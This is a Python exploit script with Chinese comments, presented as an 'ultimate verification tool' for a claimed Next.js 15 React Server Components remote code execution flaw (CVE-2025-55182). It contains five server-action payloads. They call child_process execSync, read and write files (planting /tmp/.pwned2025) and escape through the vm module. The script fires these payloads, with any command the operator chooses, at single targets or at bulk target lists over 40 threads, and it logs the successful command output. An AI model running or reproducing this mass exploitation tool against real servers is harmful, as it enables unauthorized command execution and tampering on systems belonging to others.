# -*- coding: utf-8 -*-
"""
CVE-2025-55182 Next.js 15 RSC RCE 终极验证工具（带响应时间 + 智能超时）
自动显示每个目标的响应时间，超时或慢的目标直接跳过，不卡线程！
"""

import requests
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import time
import os
from urllib3 import disable_warnings
disable_warnings()

# ====================== 配置 ======================
MAX_TIMEOUT = 3             # 单次请求最大超时（秒）—— 超过就直接放弃这个目标
THREADS = 40                  # 线程数可大胆开
BOUNDARY = "------------------------f3c2dbe7617e6475"

RESULT_DIR = "CVE-2025-55182_RCE_Results"
os.makedirs(RESULT_DIR, exist_ok=True)
success_file = os.path.join(RESULT_DIR, "RCE_SUCCESS.txt")
detail_file  = os.path.join(RESULT_DIR, "rce_results.json")

lock = threading.Lock()
success_count = 0
total_count = 0

# ====================== 5合1 Payload（不变）======================
PAYLOADS = [
    {"name": "child_process#execSync", "data": '{"id":"child_process#execSync","bound":["{{CMD}}"]}'},
    {"name": "fs#readFileSync",       "data": '{"id":"fs#readFileSync","bound":["{{CMD}}"]}'},
    {"name": "fs#writeFileSync",      "data": '{"id":"fs#writeFileSync","bound":["/tmp/.pwned2025","{{CMD}}"]}'},
    {"name": "vm#runInThisContext",   "data": '{"id":"vm#runInThisContext","bound":["process.mainModule.require(\"child_process\").execSync(\"{{CMD}}\").toString()"]}'},
    {"name": "vm#runInNewContext",    "data": '{"id":"vm#runInNewContext","bound":["this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"{{CMD}}\").toString()"]}'},
]

def build_payload(payload_json):
    body = (
        f"--{BOUNDARY}\r\n"
        f"Content-Disposition: form-data; name=\"$ACTION_REF_0\"\r\n\r\n\r\n"
        f"--{BOUNDARY}\r\n"
        f"Content-Disposition: form-data; name=\"$ACTION_0:0\"\r\n\r\n"
        f"{payload_json}\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode('utf-8')
    headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    return body, headers

# ====================== 核心检测（带响应时间）======================
def check_rce_with_time(raw_target, command):
    global success_count, total_count
    target = raw_target.strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    target = target.rstrip("/")
    url = f"{target}/formaction"

    start_time = time.time()
    success = False

    for payload in PAYLOADS:
        if success:
            break
        try:
            current_payload = payload["data"].replace("{{CMD}}", command)
            data, headers = build_payload(current_payload)

            resp = requests.post(
                url, data=data, headers=headers,
                timeout=MAX_TIMEOUT, verify=False, allow_redirects=False
            )

            elapsed = time.time() - start_time
            elapsed_str = f"{elapsed:.2f}s"

            if '"success":true' in resp.text.lower() and '"result":' in resp.text:
                try:
                    j = resp.json()
                    output = j.get("result", "").strip().replace("\\n", "\n")
                except:
                    import re
                    m = re.search(r'"result"\s*:\s*"([^"]+)"', resp.text.replace("\\n", "\n"))
                    output = m.group(1).replace("\\n", "\n").strip() if m else "[[PARSE_ERR]]"

                with lock:
                    success_count += 1
                    print(f"\n\033[91m【RCE 成功】 {target} [{elapsed_str}]\033[0m")
                    print(f"   → Payload: {payload['name']}")
                    print(f"   → 输出: {output}\033[0m")

                    with open(success_file, "a", encoding="utf-8") as f:
                        f.write(f"{target} | {elapsed_str} | {payload['name']} | {command} | {output}\n")
                success = True
                break

        except requests.exceptions.Timeout:
            print(f"\033[93m[超时跳过] {target} (> {MAX_TIMEOUT}s)\033[0m", end="\r")
            break  # 超时直接放弃这个目标，不再试其他 payload
        except Exception:
            continue  # 当前 payload 失败，尝试下一个

    # 所有 payload 都失败或超时
    if not success:
        elapsed = time.time() - start_time
        elapsed_str = f"{elapsed:.2f}s"
        print(f"\033[90m[未利用] {target} [{elapsed_str}]\033[0m", end="\r")

    total_count += 1
    print(f"\r进度: {total_count} | 成功: {success_count} | 当前命令: {command}    ", end="", flush=True)

# ====================== 主程序 ======================
def main():
    parser = argparse.ArgumentParser(description="CVE-2025-55182 RSC RCE 终极工具（带响应时间）")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="单个目标")
    group.add_argument("-f", "--file", help="批量文件")
    parser.add_argument("-c", "--command", default="whoami", help="执行命令，默认 whoami")
    args = parser.parse_args()

    print("\033[96m" + "="*90)
    print("   CVE-2025-55182 Next.js 15 RSC RCE 终极验证工具（带响应时间 + 智能超时）")
    print("   超时目标自动跳过，不卡线程！再也不用等死机目标了！")
    print("="*90 + "\033[0m\n")

    cmd = args.command.strip()

    if args.url:
        print(f"单目标测试 → {args.url}   命令: {cmd}\n")
        check_rce_with_time(args.url, cmd)
    else:
        if not os.path.exists(args.file):
            print(f"文件不存在: {args.file}")
            exit(1)
        with open(args.file, encoding="utf-8") as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        
        print(f"批量扫描 → {len(targets)} 个目标   命令: {cmd}   超时阈值: {MAX_TIMEOUT}s\n")
        start = time.time()

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(check_rce_with_time, t, cmd) for t in targets]
            for _ in as_completed(futures):
                pass  # 只需要等待完成

        elapsed_total = int(time.time() - start)
        print(f"\n\n\033[92m扫描完成！总用时 {elapsed_total}s，成功 {success_count} 个真实 RCE\033[0m")
        print(f"→ 成功列表（含响应时间）→ {success_file}")
        print(f"→ 详细记录 → {detail_file}")

if __name__ == "__main__":
    main()
